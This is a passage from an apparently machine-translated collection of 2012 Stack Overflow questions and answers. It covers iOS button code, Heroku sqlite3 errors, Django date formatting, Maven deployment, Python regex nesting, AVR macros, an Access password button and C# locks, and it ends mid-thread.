    }
    return;
}else if (numLitInt == 9)
{
    //light up the button
    [button9 setImage:[UIImage imageNamed:@"9(lite).png"] forState:UIControlStateNormal];

    //*********** play audio file ****************
    NSString* resourcePath = [[NSBundle mainBundle] resourcePath];
    resourcePath = [resourcePath stringByAppendingString:@"/ding2.m4a"];
    NSError* err;

    //Initialize our player pointing to the path to our resource
    player = [[AVAudioPlayer alloc] initWithContentsOfURL:
              [NSURL fileURLWithPath:resourcePath] error:&err];

    if( err ){
        //bail!
        NSLog(@"Failed with reason: %@", [err localizedDescription]);
    }
    else{
        //set our delegate and begin playback
        [player play];
    }
    return;
}else if (numLitInt == 10)
{
    //light up the button
    [button10 setImage:[UIImage imageNamed:@"10(lite).png"] forState:UIControlStateNormal];

    //*********** play audio file ****************
    NSString* resourcePath = [[NSBundle mainBundle] resourcePath];
    resourcePath = [resourcePath stringByAppendingString:@"/ding3.m4a"];
    NSError* err;

    //Initialize our player pointing to the path to our resource
    player = [[AVAudioPlayer alloc] initWithContentsOfURL:
              [NSURL fileURLWithPath:resourcePath] error:&err];

    if( err ){
        //bail!
        NSLog(@"Failed with reason: %@", [err localizedDescription]);
    }
    else{
        //set our delegate and begin playback
        [player play];
    }
    return;
}else if (numLitInt == 11)
{
    //light up the button
    [button11 setImage:[UIImage imageNamed:@"11(lite).png"] forState:UIControlStateNormal];

    //*********** play audio file ****************
    NSString* resourcePath = [[NSBundle mainBundle] resourcePath];
    resourcePath = [resourcePath stringByAppendingString:@"/ding4.m4a"];
    NSError* err;

    //Initialize our player pointing to the path to our resource
    player = [[AVAudioPlayer alloc] initWithContentsOfURL:
              [NSURL fileURLWithPath:resourcePath] error:&err];

    if( err ){
        //bail!
        NSLog(@"Failed with reason: %@", [err localizedDescription]);
    }
    else{
        //set our delegate and begin playback
        [player play];
    }
    return;
}

}

- (void)buttonUnLit:(NSNumber*)number
{
int numLitInt = [number intValue];

if (numLitInt == 0) 
{
    [button0 setImage:[UIImage imageNamed:@"0.png"] forState:UIControlStateNormal];
    return;
}else if (numLitInt == 1)
{
    [button1 setImage:[UIImage imageNamed:@"1.png"] forState:UIControlStateNormal];
    return;
}else if (numLitInt == 2)
{
    [button2 setImage:[UIImage imageNamed:@"2.png"] forState:UIControlStateNormal];
    return;
}else if (numLitInt == 3)
{
    [button3 setImage:[UIImage imageNamed:@"3.png"] forState:UIControlStateNormal];
    return;
}else if (numLitInt == 4)
{
    [button4 setImage:[UIImage imageNamed:@"4.png"] forState:UIControlStateNormal];
    return;
}else if (numLitInt == 5)
{
    [button5 setImage:[UIImage imageNamed:@"5.png"] forState:UIControlStateNormal];
    return;
}else if (numLitInt == 6)
{
    [button6 setImage:[UIImage imageNamed:@"6.png"] forState:UIControlStateNormal];
    return;
}else if (numLitInt == 7)
{
    [button7 setImage:[UIImage imageNamed:@"7.png"] forState:UIControlStateNormal];
    return;
}else if (numLitInt == 8)
{
    [button8 setImage:[UIImage imageNamed:@"8.png"] forState:UIControlStateNormal];
    return;
}else if (numLitInt == 9)
{
    [button9 setImage:[UIImage imageNamed:@"9.png"] forState:UIControlStateNormal];
    return;
}else if (numLitInt == 10)
{
    [button10 setImage:[UIImage imageNamed:@"10.png"] forState:UIControlStateNormal];
    return;
}else if (numLitInt == 11)
{
    [button11 setImage:[UIImage imageNamed:@"11.png"] forState:UIControlStateNormal];
    return;
}

}

- (void)viewWillDisappear:(BOOL)animated
{
[super viewWillDisappear:animated];
[player stop];

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T03:47:59.653

您可以添加另一个 var 以确定线程是否应该中断。喜欢 ：

你的 .h 文件

```
Bool flag; 
```

你的 .m 文件

```
-(void)yourBackgroundMethod{
if(flag)
 break;
} 
```

# ruby-on-rails - 无法推送到 heroku - sqlite3.h 丢失

> ID：10989183
> 
> 赞同：8
> 
> 时间：2012-06-12T00:32:54.787
> 
> 标签：ruby-on-rails, heroku, sqlite

第一篇在这里=）提前感谢您的帮助，此时任何帮助都很酷！

1-在考虑在stackoverflow上发布之前，我已经搜索了很多东西并尝试了很多东西。

2-跑步时

```
 git push heroku master 
```

我明白了：

```
 checking for sqlite3.h... no
   sqlite3.h is missing. Try 'port install sqlite3 +universal'
   or 'yum install sqlite-devel' and check your shared library search path (the
   location where your sqlite3 shared library is located). 
```

3-我检查了 Gemfile：生产和开发/测试分别为 pg 和 sqlite3 配置良好

4- Sqlite3.h 在这里：

```
 pcbo$ ls -l /usr/include/sqlite3.h
   -rw-r--r--  1 root  wheel  322724  7 Dec  2011 /usr/include/sqlite3.h 
```

5-忘了提我正在使用mac os x ..

6- 输出：pcbo$ git push heroku master

```
 Counting objects: 71, done.
    Delta compression using up to 4 threads.
    Compressing objects: 100% (58/58), done.
    Writing objects: 100% (71/71), 26.46 KiB, done.
    Total 71 (delta 8), reused 0 (delta 0)

    -----> Heroku receiving push
    -----> Ruby/Rails app detected
    -----> Installing dependencies using Bundler version 1.2.0.pre
    Running: bundle install --without development:test --path vendor/bundle --binstubs bin/ --deployment
   Fetching gem metadata from https://rubygems.org/.......
   Installing rake (0.9.2.2)
   Installing i18n (0.6.0)
   Installing multi_json (1.3.6)
   Installing activesupport (3.2.3)
   Installing builder (3.0.0)
   Installing activemodel (3.2.3)
   Installing erubis (2.7.0)
   Installing journey (1.0.3)
   Installing rack (1.4.1)
   Installing rack-cache (1.2)
   Installing rack-test (0.6.1)
   Installing hike (1.2.1)
   Installing tilt (1.3.3)
   Installing sprockets (2.1.3)
   Installing actionpack (3.2.3)
   Installing mime-types (1.18)
   Installing polyglot (0.3.3)
   Installing treetop (1.4.10)
   Installing mail (2.4.4)
   Installing actionmailer (3.2.3)
   Installing arel (3.0.2)
   Installing tzinfo (0.3.33)
   Installing activerecord (3.2.3)
   Installing activeresource (3.2.3)
   Installing coffee-script-source (1.3.3)
   Installing execjs (1.4.0)
   Installing coffee-script (2.2.0)
   Installing rack-ssl (1.3.2)
   Installing json (1.7.3) with native extensions
   Installing rdoc (3.12)
   Installing thor (0.14.6)
   Installing railties (3.2.3)
   Installing coffee-rails (3.2.2)
   Installing jquery-rails (2.0.2)
   Installing pg (0.12.2) with native extensions
   Using bundler (1.2.0.pre)
   Installing rails (3.2.3)
   Installing sass (3.1.19)
   Installing sass-rails (3.2.5)
   Installing sqlite3 (1.3.6) with native extensions
   Gem::Installer::ExtensionBuildError: ERROR: Failed to build gem native extension.
   /usr/local/bin/ruby extconf.rb
   checking for sqlite3.h... no
   sqlite3.h is missing. Try 'port install sqlite3 +universal'
   or 'yum install sqlite-devel' and check your shared library search path (the
   location where your sqlite3 shared library is located).
   *** extconf.rb failed ***
   Could not create Makefile due to some reason, probably lack of
   necessary libraries and/or headers.  Check the mkmf.log file for more
   details.  You may need configuration options.
   Provided configuration options:
   --with-opt-dir
   --without-opt-dir
   --with-opt-include
   --without-opt-include=${opt-dir}/include
   --with-opt-lib
   --without-opt-lib=${opt-dir}/lib
   --with-make-prog
   --without-make-prog
   --srcdir=.
   --curdir
   --ruby=/usr/local/bin/ruby
   --with-sqlite3-dir
   --without-sqlite3-dir
   --with-sqlite3-include
   --without-sqlite3-include=${sqlite3-dir}/include
   --with-sqlite3-lib
   --without-sqlite3-lib=${sqlite3-dir}/lib
   --enable-local
   --disable-local
   Gem files will remain installed in /tmp/build_zmjrcoagwpai/vendor/bundle/ruby/1.9.1/gems/sqlite3-1.3.6 for inspection.
   Results logged to /tmp/build_zmjrcoagwpai/vendor/bundle/ruby/1.9.1/gems/sqlite3-1.3.6/ext/sqlite3/gem_make.out
   An error occurred while installing sqlite3 (1.3.6), and Bundler cannot continue.
   Make sure that `gem install sqlite3 -v '1.3.6'` succeeds before bundling.
   !
   !     Failed to install gems via Bundler.
   !
   !     Heroku push rejected, failed to compile Ruby/rails app 
```

7-非常感谢任何帮助！

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-06-12T07:51:20.020

**[更新1]**

从您的 git push 日志中，这是您的罪魁祸首：-

```
 Installing sqlite3 (1.3.6) with native extensions 
```

所以，正如我最初怀疑的那样，错误是试图加载`sqlite3`将在 heroku 上失败的 gem。如前所述，这可能由于两个原因而发生

1.  Gemfile 被错误配置为在生产中需要 sqlite3 gem
2.  其他一些宝石依赖于`sqlite3`宝石。使用该`gem dependency`命令显示 gem 的依赖关系并删除依赖于`sqlite3`.

之后，重新运行`bundle install`它会工作。

---[结束更新1]---

出现此错误的唯一原因是尝试`sqlite3`在不支持的 heroku 上使用数据库时。所以仔细检查你的`Gemfile`，并确保它的设置类似于这个

```
group :production do
  gem 'pg'
end
group :development, :test do
  gem 'sqlite3'
end 
```

然后`bundle install`重新生成你的`Gemfile.lock`. 现在，尝试推动heroku。如果您仍然收到此错误，那么您正在使用的某些 gem 可能已在其文件中列为`sqlite3`硬编码依赖项。`gemspec`所以实际上，即使在 gemfile 中不存在 sqlite3，它也会被加载。所以验证这一点，在 localhost 上运行以下命令：

```
$ bundle install | grep sqlite 
```

最后，在尝试了这个之后。它不起作用。发回**完整**的日志`git push heroku master`和输出`heroku logs`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T09:44:31.773

似乎缺少 sqlite 库。尝试找到它

```
whereis sqlite3.h 
```

如果它在您的系统中，请尝试：

```
sudo gem install sqlite3-ruby -- --with-sqlite3-include=<"url where it is(for eg: /usr/include)"> 
```

问候

# python - 在 Django 中格式化日期时如何使用本地化的“短格式”？

> ID：10989184
> 
> 赞同：11
> 
> 时间：2012-06-12T00:33:04.607
> 
> 标签：python, django, date-format

我需要显示一个本地化的格式化日期。如果我使用 django.utils.formats.localize，日期将返回为“2012 年 6 月 11 日”。我如何格式化日期以返回“06/11/2012”，并具有适当的本地化（例如，“11/06/2012 in UK）？

我需要类似于 Java 的[DateFormat.SHORT](http://docs.oracle.com/javase/6/docs/api/java/text/DateFormat.html)的东西。有没有类似的东西？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-06-12T02:44:02.633

是的，有[SHORT_DATE_FORMAT](https://docs.djangoproject.com/en/dev/ref/settings/#std:setting-SHORT_DATE_FORMAT)。

在模板中，可以将它与[日期过滤器](https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date)一起使用：

```
{{ your_date_value|date:"SHORT_DATE_FORMAT" }} 
```

在模板之外，可以使用`django.utils.formats.date_format`，如下所示：

```
from django.utils.formats import date_format
date_format(date_obj, format='SHORT_DATE_FORMAT', use_l10n=True) 
```

# ruby-on-rails - 让 MiniMagick 例程尽可能在 Ruby/Rails 上运行？

> ID：10989186
> 
> 赞同：0
> 
> 时间：2012-06-12T00:33:20.410
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, imagemagick

以下代码只是将给定字符串写入存储到文件系统的现有图像。就图像处理而言，它并不是很复杂。但是，调用 MiniMagick 显然会产生一些开销。另外，这个例程会被非常频繁地调用，所以需要尽快完成。

除了将图像缓存到磁盘之外，我还有哪些使用 rails/ruby 的选项来确保此代码以最佳性能运行？

```
variable = "some string"

mm = MiniMagick::Image.open("#{Rails.root}/app/assets/images/b.png")
  mm.combine_options do |c| 
    c.gravity 'center' 
    c.pointsize '13' 
    c.draw "text 33,0 '#{variable}'" 
  end

 send_data(mm.to_blob, :type => 'image/png', :disposition => 'inline' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T12:26:32.303

图像处理的标准方法是在后台进行 - 用户上传图像（可能直接到 S3），然后服务器在后台处理图像缩略图。

这使应用程序尽可能快。这是一种使用 resque 在后台处理载波上传的方法：[https ://github.com/lardawge/carrierwave_backgrounder](https://github.com/lardawge/carrierwave_backgrounder)

然后，您可以将此图像处理移至载波作为一个步骤，然后您就可以开始了！

# html - 当设置为相同宽度时，输入和文本区域出现不同的宽度？

> ID：10989187
> 
> 赞同：9
> 
> 时间：2012-06-12T00:28:06.297
> 
> 标签：html, css

当我将输入和文本区域的宽度设置为 94% 时，它们的宽度似乎略有不同。这是我在许多网站上多次看到的。

谁能解释为什么 textarea 在设置为相同的 % 宽度时不如输入那么宽？

```
input, textarea {
    width: 94%;
} 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-06-12T00:31:44.073

1.  不要忘记[盒子模型](http://www.addedbytes.com/for-beginners/the-box-model-for-beginners/)包括边框、填充和边距。它们都会影响页面中元素的实际物理宽度。
2.  除非您使用[CSS 重置](http://meyerweb.com/eric/tools/css/reset/)，否则您将受制于为每个元素设置不同边框、填充和边距的默认浏览器样式表。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-06-12T02:07:37.277

使用 CSS3，您还可以使用：

```
-webkit-box-sizing: border-box; /* Safari/Chrome, other WebKit */
-moz-box-sizing: border-box;    /* Firefox, other Gecko */
box-sizing: border-box;         /* Opera/IE 8+ */ 
```

# maven - maven 部署文件失败，出现 503：找不到 maven-metadata.xml

> ID：10989193
> 
> 赞同：1
> 
> 时间：2012-06-12T00:34:09.323
> 
> 标签：maven, deployment, nexus, maven-metadata

我正在使用 Maven 将我们的项目与其他人集成，可能以一种不受欢迎的方式并遇到了问题。

我们有一个使用 Ant 编译的项目。Ant 脚本又大又厉害，所以当我们使用 Maven 进行集成时，决定继续使用 Ant 编译。

现在假设 Ant 编译输出为 res-1.0-SNAPSHOT.tar.gz。（任何文件名都可以，但它是 tar.gz）我正在将该文件部署到一个名为“snapshots”的由 nexus 托管的快照存储库。

我尝试使用以下命令进行部署：

```
mvn deploy:deploy-file \
  -DgroupId="com.my-company" \
  -DartifactId="res" \
  -Dversion="1.0-SNAPSHOT" \
  -Dpackaging="tar.gz" \
  -Dfile="res-1.0-SNAPSHOT.tar.gz" \
  -Durl="http://our-nexus-ip/nexus/content/repositories/snapshots" \
  -DrepositoryId="snapshots" 
```

我在 ~/.m2 中有一个简单的 settings.xml，带有代理和服务器设置。但是服务器设置尚未在当前进度中使用，错误的密码不会出错。

输出是这样的：

```
[[root@cnbi maven]# ./run.sh
+ mvn deploy:deploy-file -DgroupId=com.my-company -DartifactId=res -Dversion=1.0-SNAPSHOT -Dpackaging=tar.gz -Dfile=res-1.0-SNAPSHOT.tar.gz -Durl=http://135.252.234.142:8081/nexus/content/repositories/snapshots -DrepositoryId=snapshots
Warning: JAVA_HOME environment variable is not set.
[INFO] Scanning for projects...
[INFO] Searching repository for plugin with prefix: 'deploy'.
[INFO] ------------------------------------------------------------------------
[INFO] Building Maven Default Project
[INFO]    task-segment: [deploy:deploy-file] (aggregator-style)
[INFO] ------------------------------------------------------------------------
[INFO] [deploy:deploy-file]
[INFO] Retrieving previous build number from snapshots
[INFO] ------------------------------------------------------------------------
[ERROR] BUILD ERROR
[INFO] ------------------------------------------------------------------------
[INFO] Error retrieving previous build number for artifact 'com.my-company:res:tar.gz': repository metadata for: 'snapshot com.my-company:res:1.0-SNAPSHOT' could not be retrieved from repository: snapshots due to an error: Error transferring file

Server returned HTTP response code: 503 for URL: http://135.252.234.142:8081/nexus/content/repositories/snapshots/com/my-company/res/1.0-SNAPSHOT/maven-metadata.xml
[INFO] ------------------------------------------------------------------------
[INFO] For more information, run Maven with the -e switch
[INFO] ------------------------------------------------------------------------
[INFO] Total time: 51 seconds
[INFO] Finished at: Tue Jun 12 08:44:13 CST 2012
[INFO] Final Memory: 7M/209M
[INFO] ------------------------------------------------------------------------ 
```

你看，它找不到 maven-metadata.xml。可以肯定的是，存储库中根本不存在文件及其文件夹“com/my-company”。

除了您可能会发现对 Maven 的任何滥用之外，我的问题是：

1) 我是否以正确的方式使用 Maven？（部署 tar.gz，使用 deploy:deploy-file...）

2）是否有不正确的参数？

3) maven-metadata.xml 是做什么用的？它不存在，但 Maven 坚持要找到它——我猜它是生成的，我错过了一些步骤吗？

解决方案可能很愚蠢，我真的不熟悉 Maven。不幸的是，它必须完成......请帮我解决这个问题。

Maven 版本是 2.0.11。如果您想了解更多信息，请告诉我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T08:03:53.350

我遇到了同样的问题，我们的关系中有一个错误。

使用**maven3**（具有相同的*settings.xml*、*pom.xml*和*.m2* repo）解决了我们的问题，并且比升级 nexus 更容易。

您也可以检查[此错误](https://issues.sonatype.org/browse/NEXUS-2059)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-02-07T12:44:38.793

如果您仍然坚持使用 Ant，我建议您至少考虑将 Ivy 添加到图片中，作为您的依赖项管理器。如果我没记错的话，它能够更新`maven-metadata.xml`存储库中的文件。

看看[这个](https://github.com/strongbox/strongbox-examples/tree/master/hello-strongbox-ant-ivy)例子。

# python - 正则表达式中的 Python 正则表达式否定

> ID：10989198
> 
> 赞同：4
> 
> 时间：2012-06-12T00:35:33.707
> 
> 标签：python, regex

鉴于：

```
ABC
content 1
123
content 2
ABC
content 3
XYZ 
```

是否可以创建与“ABC[\W\w]+?XYZ”的最短版本匹配的正则表达式

本质上，我正在寻找“ABC 后跟任何以 XYZ 结尾的字符，但如果我在两者之间遇到 ABC 则不匹配”（但将 ABC 视为潜在的正则表达式本身，因为它并不总是固定长度。 ..so ABC 或 ABcC 也可以匹配）

因此，更一般地说：REGEX1 后跟任何字符并由 REGEX2 终止，如果 REGEX1 出现在两者之间，则不匹配。

在这个例子中，我不想要前 4 行。

（我相信这个解释可能需要......进一步解释哈哈）

**编辑：**

好吧，我认为现在需要进一步解释！感谢您迄今为止的建议。在我开始研究如何将您提出的每个解决方案应用于我的问题时，我至少会给您更多的思考。

**建议1：**颠倒字符串内容和正则表达式。

这当然是一个非常有趣的 hack，它根据我的解释解决了问题。在简化问题时，我也没有提到同样的事情可能会反过来发生，因为结束签名也可能在以后存在（并且已证明在我的具体情况下）。这引入了如下所示的问题：

```
ABC
content 1
123
content 2
ABC
content 3
XYZ
content 4
MNO
content 5
XYZ 
```

In this instance, I would check for something like "ABC through XYZ" meaning to catch [ABC, content 1, XYZ]...but accidentally catching [ABC, content 1, 123, content 2, ABC, content 3, XYZ]. Reversing that would catch [ABC, content 3, XYZ, content 4, MNO, content 5, XYZ] instead of the [ABC, content 2, XYZ] that we want again. The point is to try to make it as generalized as possible because I will also be searching for things that could potentially have the same starting signature (regex "ABC" in this case), and different ending signatures.

If there is a way to build the regexes so that they encapsulate this sort of limitation, it could prove much easier to just reference that any time I build a regex to search for in this type of string, rather than creating a custom search algorithm that deals with it.

**Proposal 2:** A+B+C+[^A]+[^B]+[^C]+XYZ with IGNORECASE flag

This seems nice in the case that ABC is finite. Think of it as a regex in itself though. For example:

```
Hello!GoodBye!Hello.Later. 
```

VERY simplified version of what I'm trying to do. I would want "Hello.Later." given the start regex Hello[!.] and the end Later[!.]. Running something simply like Hello[!.]Later[!.] would grab the entire string, but I'm looking to say that if the start regex Hello[!.] exists between the first starting regex instance found and the first ending regex instance found, ignore it.

The convo below this proposal indicates that I might be limited by regular language limitations similar to the parentheses matching problem (Google it, it's fun to think about). The purpose of this post is to see if I do in fact have to resort to creating an underlying algorithm that handles the issue I'm encountering. I would very much like to avoid it if possible (in the simple example that I gave you above, it's pretty easy to design a finite state machine for...I hope that holds as it grows slightly more complex).

**Proposal 3:** ABC(?:(?!ABC).)*?XYZ with DOTALL flag

I like the idea of this if it actually allows ABC to be a regex. I'll have to explore this when I get in to the office tomorrow. Nothing looks too out of the ordinary at first glance, but I'm entirely new to python regex (and new to actually applying regexes in code instead of just in theory homework)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-12T01:06:22.447

A regex solution would be `ABC(?:(?!ABC).)*?XYZ` with the `DOTALL` flag.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T01:05:51.133

## Edit

So after reading your further explanations, I would say that my previous proposal, as well as MRAB's one are somehow similar and won't be of any help here. Your problem *is* actually the prolem of *nested structures*.

Think of your 'prefix' and 'suffix' as symbols. You could easily replace them with an opening and a closing parenthesis or whatever, and what you want is being able to match only the smallest (then deepest) pair ...

For example if your prefix is 'ABC.' and your suffix is 'XYZ.':

```
ABChello worldABCfooABCbarXYZ 
```

You want to get only `ABCbarXYZ`.

It's the same if the prefix is `(`, and the suffix is `)`, the string:

```
(hello world(foo(bar) 
```

It would match ideally only `(bar)` ...

Definitely you have to use a [context free grammar](http://en.wikipedia.org/wiki/Context-free_grammar) (like programming languages do: [C grammar](http://www.lysator.liu.se/c/ANSI-C-grammar-y.html), [Python grammar](http://docs.python.org/reference/grammar.html)) and a [parser](http://www.ling.helsinki.fi/kit/2008s/clt231/nltk-0.9.5/doc/en/ch07.html), or make your own by using regex as well as the iterating and storing mechanisms of your programming language.

But that's not possible with only regular expressions. They would probably help in your algorithm, but they just are not designed to handle that alone. Not the good tool for that job ... You cannot inflate tires with a screwdriver. Therefore, you will have to use some external mechanisms, not complicated though, to store the context, your position in the nested stack. Using your regular expression in each single context still may be possible.

*Finite state machines* are *finite*, and nested structures have an *arbitrary depth* that would require your automaton to grow arbitrarily, thus they are not [*regular languages*](http://en.wikipedia.org/wiki/Regular_language).

> Since recursion in a grammar allows the definition of nested syntactic structures, any language (including any programming language) which allows nested structures is a context-free language, not a regular language. For example, the set of strings consisting of balanced parentheses [like a LISP program with the alphanumerics removed] is a context-free language [see here](http://www.augustana.ca/~jmohr/courses/common/csc370/lecture_notes/chomsky.html)

## Former proposal (not relevant anymore)

If I do:

```
>>> s = """ABC
content 1
123
content 2
ABC
content 3
XYZ"""
>>> r = re.compile(r'A+B+C+[^A]+[^B]+[^C]+XYZ', re.I)
>>> re.findall(r,s) 
```

I get

```
['ABC\ncontent 3\nXYZ'] 
```

Is that what you want ?

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T12:16:21.097

There is another method of solving this problem: not trying to do it in one regex. You could split the string by the first regex, and then use the second one on the last part.

Code is the best explanation:

```
s = """ABC
content 1
123
content 2
ABC
content 3
XYZ
content 4
XYZ"""

# capturing groups to preserve the matched section
prefix = re.compile('(ABC)')
suffix = re.compile('(XYZ)')

# prefix.split(s) == ['', 'ABC', [..], 'ABC', '\ncontent 3\nXYZ\ncontent 4\nXYZ']
#                          prefixmatch ^^^^^  ^^^^^^^^^^^^ rest ^^^^^^^^^^^^^^^^
prefixmatch, rest = prefix.split(s)[-2:]

# suffix.split(rest,1) == ['\ncontent 3\n', 'XYZ', '\ncontent 4\nXYZ']
#                          ^^ interior ^^   ^^^^^ suffixmatch
interior, suffixmatch = suffix.split(rest,1)[:2]

# join the parts up.
result = '%s%s%s' % (prefixmatch, interior, suffixmatch)

# result == 'ABC\ncontent 3\nXYZ' 
```

Some points:

*   there should be appropriate error handling (even just `try: ... except ValueError: ..` around the whole thing) to handle the case when either regex doesn't match at all and so the list unpacking fails.
*   this assumes that the desired segment will occur immediately after the last occurrence of `prefix`, if not, then you can iterate through the results of `prefix.split(s)` two at a time (starting at index 1) and do the same splitting trick with `suffix` to find all the matches.
*   this likely to be reasonably inefficient, since it creates quite a few intermediate data structures.

# javascript - 随机引用超链接脚本？

> ID：10989199
> 
> 赞同：0
> 
> 时间：2012-06-12T00:36:07.683
> 
> 标签：javascript, html, string, dom, random

嗨，我一直在试图弄清楚如何使用随机报价脚本，其中每个报价都是其指向不同页面的超链接。到目前为止，这是我用于引号的示例。有没有办法让每个报价都有自己的超链接？

```
<script language="JavaScript">

var Quotation=new Array() // do not change this!

Quotation[0] = "Test.";
Quotation[1] = "Sanity is a golden apple with no shoelaces.";
Quotation[2] = "Repent! The end is coming, $9.95 at Amazon.";
Quotation[3] = "Honesty blurts where deception sneezes.";
Quotation[4] = "Pastry satisfies where art is unavailable.";
Quotation[5] = "Delete not, lest you, too, be deleted.";
Quotation[6] = "O! Youth! What a pain in the backside.";
Quotation[7] = "Wishes are like goldfish with propellors.";
Quotation[8] = "Love the river's \"beauty\", but live on a hill.";
Quotation[9] = "Invention is the mother of too many useless toys.";

var Q = Quotation.length;
var whichQuotation=Math.round(Math.random()*(Q-1));
function showQuotation(){document.write(Quotation[whichQuotation]);}
showQuotation();
</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T00:48:33.983

该脚本将自己替换为带有`<a>`随机引号和相应 href 的标签：

```
<script>
(function(){

    var quotes = [
      {text: "Test.", href: "http://example.com"},
      {text: "Sanity is a golden apple with no shoelaces.", href: "http://example.com"},
      {text: "Repent! The end is coming, $9.95 at Amazon.", href: "http://example.com"},
      {text: "Honesty blurts where deception sneezes.", href: "http://example.com"},
      {text: "Pastry satisfies where art is unavailable.", href: "http://example.com"},
      {text: "Delete not, lest you, too, be deleted.", href: "http://example.com"},
      {text: "O! Youth! What a pain in the backside.", href: "http://example.com"},
      {text: "Wishes are like goldfish with propellors.", href: "http://example.com"},
      {text: "Love the river's \"beauty\", but live on a hill.", href: "http://example.com"},
      {text: "Invention is the mother of too many useless toys.", href: "http://example.com"}
    ];

    var scripts = document.getElementsByTagName('script');
    var script = scripts[scripts.length - 1];
    var quote = quotes[Math.floor(Math.random()*quotes.length)];
    var a = document.createElement('a');
    a.href = quote.href;
    a.appendChild(document.createTextNode(quote.text));
    script.parentNode.replaceChild(a, script);

})();
</script> 
```

[**JSFiddle**](http://jsfiddle.net/Paulpro/7GAZC/)

如果您只想将脚本放在您希望链接所在的位置并且您只想在页面上执行一次，这是最好的方法。如果您想在一个页面上多次使用它，您可以稍微不同地执行此操作，这样您就不需要脚本的多个副本。

# c - 如何将 pgm_read_byte 宏 (AVR-GCC) 移植到 Mircrochip C18 编译器？

> ID：10989200
> 
> 赞同：3
> 
> 时间：2012-06-12T00:36:12.213
> 
> 标签：c, assembly, embedded, avr, avr-gcc

我正在将[基于 T6963 的 LCD 驱动程序](http://en.radzio.dxp.pl/t6963/)从 AVR-GCC 移植到微芯片 C18 编译器。我看过宏“ [pgm_read_byte](http://www.nongnu.org/avr-libc/user-manual/group__avr__pgmspace.html) ”：有人知道如何移植这个宏吗？

**更新**

从[这里](http://www.koders.com/c/fidE0465E75E0EDBBCF1855F09FF4A43B8518C4346D.aspx)我可以看到宏的实现

```
#define   pgm_read_byte(address_short)
pgm_read_byte_near(address_short)
...
#define   pgm_read_byte_near(address_short)   __LPM((uint16_t)(address_short))
...
#define   __LPM(addr)                         __LPM_enhanced__(addr)
...
#define __LPM_enhanced__(addr)  \
(__extension__({                \
    uint16_t __addr16 = (uint16_t)(addr); \
    uint8_t __result;           \
    __asm__                     \
    (                           \
        "lpm %0, Z" "\n\t"      \
        : "=r" (__result)       \
        : "z" (__addr16)        \
    );                          \
    __result;                   \
})) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T01:02:32.713

根据您发布的链接，宏定义为：

```
#define   pgm_read_byte(address_short)        pgm_read_byte_near(address_short)
#define   pgm_read_byte_near(address_short)   __LPM((uint16_t)(address_short)) 
```

这些宏应该是可移植的，没有任何问题，它们只是给其他函数/宏的名称起别名。你*具体*有什么问题？到目前为止，您尝试了什么，出了什么问题？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-27T01:41:24.617

AVR 是哈佛架构，而 pgm_read_ 宏用于访问 AVR 的闪存，该闪存位于 RAM 之外的其他地址空间中。

在具有线性地址空间的目标上，您可以只使用指针来访问数据：

```
#if defined (__GNUC__) && defined (__AVR__)
#include <avr/pgmspace.h>
#else
#include <stdint.h>
#define PROGMEM /* empty */
#define pgm_read_byte(x) (*(x))
#define pgm_read_word(x) (*(x))
#define pgm_read_float(x) (*(x))
...
#endif 
```

# password-protection - Access 2010：有没有办法创建受密码保护的表单/按钮？

> ID：10989203
> 
> 赞同：1
> 
> 时间：2012-06-12T00:36:21.803
> 
> 标签：password-protection, ms-access-2010

有没有办法在 access 2010 中创建受密码保护的表单或按钮？

我试过这个（http://technologytraining.psu.edu/node/728）但是当我输入错误的密码时，它仍然可以工作。

请问有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-13T13:46:18.667

我设法解决了我的问题！@HansUp 谢谢你的帮助！我没有启用控件。

```
 Private Sub MyButton_Click()
      Const cstrPassWord As String = "open"
      Dim strPassWord As String
      strPassWord = InputBox("Password:")
      If strPassWord = cstrPassWord Then
            Forms!Pharmacy.Form!pharmacy_warehouse_stock_Subform.Form!delete_query_button.Enabled = True

     Else
        MsgBox "Incorrect password."
     End If
  End Sub 
```

# c# - 防止方法同时从不同的线程执行

> ID：10989206
> 
> 赞同：5
> 
> 时间：2012-06-12T00:36:42.097
> 
> 标签：c#

我是否正确，防止方法同时执行两次的唯一方法是使用`lock`语句？

```
private object lockMethod = new object();

public void Method() {
    lock (lockMethod) {
        // work
    }
}

public void FromThread1() {
    Method();
}

public void FromThread2() {
    Method();
} 
```

当然我也可以使用`MethodImpl(MethodImplOptions.Synchronized)`几乎相同的东西。

还有其他技术吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-12T00:39:07.857

> 我是否正确，防止方法同时执行两次的唯一方法是使用 lock 语句？

不，但这是“标准”方式，而且可能是最好的方式。话虽如此，通常您会使用锁来同步对*特定数据*的访问，而不是对整个方法的访问。锁定整个方法可能会导致不必要的阻塞。

至于其他方法，[System.Threading](http://msdn.microsoft.com/en-us/library/system.threading)命名空间包含许多其他用于以各种形式进行同步的类型，包括`ReaderWriterLockSlim`、`Semaphore`、`Mutex`、 the `Monitor class`（这是`lock`内部使用的）等。它们都提供了各种同步数据的方法，尽管每种方法都适用于不同的场景。在这种情况下，`lock`是使用适当的方法。

# silverlight - 用户控件与自定义控件 Silverliht

> ID：10989207
> 
> 赞同：0
> 
> 时间：2012-06-12T00:36:43.550
> 
> 标签：silverlight

对于开发具有许多不同可用小部件、图形、网格等的仪表板，用户控件是最好使用的还是自定义控件？

我对使用它们的最佳情况有点困惑

这与 Silverlight 5 有关

保罗

* * *

## 回答 #1

> 赞同：2
> 
